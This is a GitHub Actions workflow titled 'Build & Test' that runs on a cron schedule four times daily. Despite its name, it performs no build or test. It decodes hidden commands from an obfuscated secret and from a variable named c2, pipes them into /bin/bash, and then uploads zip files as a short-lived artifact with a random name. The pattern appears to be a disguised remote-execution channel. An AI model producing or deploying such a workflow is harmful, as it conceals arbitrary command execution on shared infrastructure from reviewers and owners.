name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '1 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          kgw585: ${{ secrets.kgw585 }}
        run: |
          printf '%s' "$kgw585" | jq -r .erqgc674 | /bin/bash
          echo $c2 | jq -r .n393 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: FD2wxrVq
          path: "*.zip"
          retention-days: 1
